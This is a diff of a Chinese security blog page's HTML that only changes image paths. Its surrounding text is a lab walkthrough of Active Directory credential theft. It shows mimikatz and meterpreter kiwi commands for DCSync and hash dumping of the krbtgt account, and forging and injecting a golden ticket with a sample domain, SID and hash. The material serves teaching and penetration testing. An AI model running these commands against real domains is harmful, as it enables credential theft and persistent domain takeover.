@@ -417,12 +417,12 @@ SS（Service Server）&#x3D; 特定服务提供端<span aria-hidden="true" class
 <p>mimikatz 会模拟域控，向目标域控请求账号密码信息。 这种方式动静更小，不用直接登陆域控，也不需要提取NTDS.DIT文件。需要域管理员或者其他类似的高权限账户。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lsadump::dcsync /user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/08/10/PTH-PTT/PTH-PTT.assets%5Cimage-20230808155305370.png" alt="image-20230808155305370"></p>
-<p><img src="/2023/08/10/PTH-PTT/PTH-PTT.assets%5Cimage-20230808155326272.png" alt="image-20230808155326272"></p>
+<p><img src="/2023/08/10/PTH-PTT/image-20230808155305370.png" alt="image-20230808155305370"></p>
+<p><img src="/2023/08/10/PTH-PTT/image-20230808155326272.png" alt="image-20230808155326272"></p>
 <p>或者在 meterpreter 中使用 kiwi 扩展</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dcsync_ntlm krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/08/10/PTH-PTT/PTH-PTT.assets%5Cimage-20230808161546974.png" alt="image-20230808161546974"></p>
+<p><img src="/2023/08/10/PTH-PTT/image-20230808161546974.png" alt="image-20230808161546974"></p>
 <ul>
 <li>LSA(mimikatz)</li>
 </ul>
@@ -437,20 +437,20 @@ lsadump::lsa &#x2F;inject &#x2F;name:krbtgt<span aria-hidden="true" class="line-
 </ul>
 <pre class="line-numbers language-none"><code class="language-none">hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/08/10/PTH-PTT/PTH-PTT.assets%5Cimage-20230808164517593.png" alt="image-20230808164517593"></p>
+<p><img src="/2023/08/10/PTH-PTT/image-20230808164517593.png" alt="image-20230808164517593"></p>
 <h4 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h4><h5 id="使用meterpreter中的kiwi模块"><a href="#使用meterpreter中的kiwi模块" class="headerlink" title="使用meterpreter中的kiwi模块"></a>使用meterpreter中的kiwi模块</h5><pre class="line-numbers language-none"><code class="language-none">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">golden_ticket_create <span class="token parameter variable">-d</span> <span class="token operator">&lt;</span>域名<span class="token operator">></span> <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>任意用户名<span class="token operator">></span> <span class="token parameter variable">-s</span> <span class="token operator">&lt;</span>Domain SID<span class="token operator">></span> <span class="token parameter variable">-k</span> <span class="token operator">&lt;</span>krbtgt NTLM Hash<span class="token operator">></span> <span class="token parameter variable">-t</span> <span class="token operator">&lt;</span>ticket本地存储路径如:/tmp/krbtgt.ticket<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">golden_ticket_create <span class="token parameter variable">-d</span> de1ay.com <span class="token parameter variable">-u</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-s</span> S-1-5-21-2756371121-2868759905-3853650604 <span class="token parameter variable">-k</span> 82dfc71b72a11ef37d663047bc2088fb <span class="token parameter variable">-t</span> /tmp/krbtgt.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/08/10/PTH-PTT/PTH-PTT.assets%5Cimage-20230808164952929.png" alt="image-20230808164952929"></p>
+<p><img src="/2023/08/10/PTH-PTT/image-20230808164952929.png" alt="image-20230808164952929"></p>
 <p>把伪造的票据注入到内存</p>
 <pre class="line-numbers language-none"><code class="language-none">kerberos_ticket_use &#x2F;tmp&#x2F;krbtgt.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这样就访问到域内其他机器的文件了</p>
-<p><img src="/2023/08/10/PTH-PTT/PTH-PTT.assets%5Cimage-20230808165850440.png" alt="image-20230808165850440"></p>
-<p><img src="/2023/08/10/PTH-PTT/PTH-PTT.assets%5Cimage-20230809092817045.png" alt="image-20230809092817045"></p>
+<p><img src="/2023/08/10/PTH-PTT/image-20230808165850440.png" alt="image-20230808165850440"></p>
+<p><img src="/2023/08/10/PTH-PTT/image-20230809092817045.png" alt="image-20230809092817045"></p>
 <h5 id="使用mimikatz"><a href="#使用mimikatz" class="headerlink" title="使用mimikatz"></a>使用mimikatz</h5><p>使用mimikatz伪造黄金票据</p>
 <p>进入mimikatz交互页面,然后先查看当前票据</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
